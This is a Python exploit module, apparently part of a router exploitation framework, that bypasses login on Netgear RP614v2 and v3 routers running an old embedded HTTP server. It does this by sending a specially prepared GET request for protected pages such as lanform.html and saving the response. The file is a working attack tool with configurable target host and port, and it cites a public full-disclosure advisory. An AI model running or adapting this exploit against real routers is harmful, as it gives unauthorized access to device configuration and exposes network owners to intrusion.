# Name:Netgear RP614 authentication bypass
# File:rp614_auth_bypass.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 4.2.2016
# Last modified: 4.2.2016
# Shodan Dork:
# Description: Bypasses router authentication on Netgear RP614v3 and v2
# seems to affect products which use Embedded HTTPD v1.00, 1999(c) Delta Networks Inc.
# Based on: http://seclists.org/fulldisclosure/2016/Feb/35

import core.Exploit
import core.io

import requests

import interface.utils
from interface.messages import print_error, print_success, print_help, print_info


class Exploit(core.Exploit.RextExploit):
    """
Name:Netgear RP614 authentication bypass
File:rp614_auth_bypass.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 4.2.2016
Description: Bypasses router authentication on Netgear RP614v3 and v2
seems to affect products which use Embedded HTTPD v1.00, 1999(c) Delta Networks Inc.
Based on: http://seclists.org/fulldisclosure/2016/Feb/35

Options:
    Name        Description

    host        Target host
    port        Target port
    file        Filename which will be downloaded from target e.g. lanform.html
    """
    file = ""

    def __init__(self):
        self.file = "lanform.html"
        core.Exploit.RextExploit.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
            elif args[0] == "port":
                if str.isdigit(args[1]):
                    self.port = args[1]
                else:
                    print_error("port value must be integer")
            elif args[0] == "file":
                self.file = args[1]
        except IndexError:
            print_error("please specify value for variable")

    def do_file(self, e):
        print_info(self.file)

    def help_file(self, e):
        print_help("Prints current value of file")

    def do_run(self, e):
        target = "http://%s:%s/%s" % (self.host, self.port, self.file)
        try:
            # We have to manually craft the request if you use requests.get it sents HEAD first
            # and the exploit won't work
            request = requests.Request('GET', target)
            r = request.prepare()
            s = requests.Session()
            response = s.send(r, timeout=30)
            s.close()

            if response.status_code == 200:
                print_success("writing to file%s" % self.file)
                core.io.writetextfile(response.text, self.file)
            else:
                print_error("exploit probably failed got response code %s" % response.status_code)

        except requests.RequestException:
            print_error("timeout!")

Exploit()
